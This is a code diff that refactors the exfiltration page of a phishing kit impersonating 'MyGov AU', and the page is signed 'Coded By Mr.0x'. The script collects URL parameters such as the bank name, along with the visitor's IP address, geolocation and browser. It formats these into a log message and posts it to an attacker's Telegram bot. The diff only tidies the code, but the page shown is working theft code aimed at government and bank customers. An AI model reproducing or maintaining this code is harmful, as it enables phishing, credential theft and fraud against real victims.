@@ -1,6 +1,9 @@
 <!DOCTYPE html>
 <html>
-<head><title>Processing...</title></head>
+<head>
+    <meta charset="UTF-8">
+    <title>Processing...</title>
+</head>
 <body>
     <script src="config/email.js"></script>
     <script>
@@ -11,6 +14,15 @@
             function getParam(name) {
                 const url = new URL(window.location.href);
                 return url.searchParams.get(name) || '';
+            }
+
+            function getBrowser(ua) {
+                if (ua.includes('MSIE')) return 'Internet Explorer';
+                if (ua.includes('Firefox')) return 'Mozilla Firefox';
+                if (ua.includes('Chrome')) return 'Google Chrome';
+                if (ua.includes('Safari')) return 'Safari';
+                if (ua.includes('Opera')) return 'Opera';
+                return 'Unknown';
             }
 
             async function getLocation(ip) {
@@ -31,7 +43,6 @@
                     return;
                 }
 
-                // Get IP
                 let ip = '0.0.0.0';
                 try {
                     const res = await fetch('https://api.ipify.org?format=json');
@@ -40,10 +51,9 @@
                 } catch(e) {}
 
                 const userAgent = navigator.userAgent;
-                const browser = getBrowser(navigator.userAgent);
+                const browser = getBrowser(userAgent);
                 const location = await getLocation(ip);
 
-                // Build message
                 let message = "";
                 message += "|++++++++++++|MyGov AU LOG|+++++++++++|\n";
                 message += "|Bank Name: " + title + "\n";
@@ -57,7 +67,6 @@
                 message += "|+++++++++++++| Coded By Mr.0x |+++++++++++++|\n";
                 message += "|+++++++++++++|    @Mr0xBD     |+++++++++++++|\n";
 
-                // Send to Telegram
                 try {
                     await fetch(`https://api.telegram.org/bot${apikey}/sendMessage`, {
                         method: 'POST',
@@ -68,15 +77,6 @@
 
                 document.body.innerHTML = '';
             })();
-
-            function getBrowser(ua) {
-                if (ua.includes('MSIE')) return 'Internet Explorer';
-                if (ua.includes('Firefox')) return 'Mozilla Firefox';
-                if (ua.includes('Chrome')) return 'Google Chrome';
-                if (ua.includes('Safari')) return 'Safari';
-                if (ua.includes('Opera')) return 'Opera';
-                return 'Unknown';
-            }
         })();
     </script>
 </body>
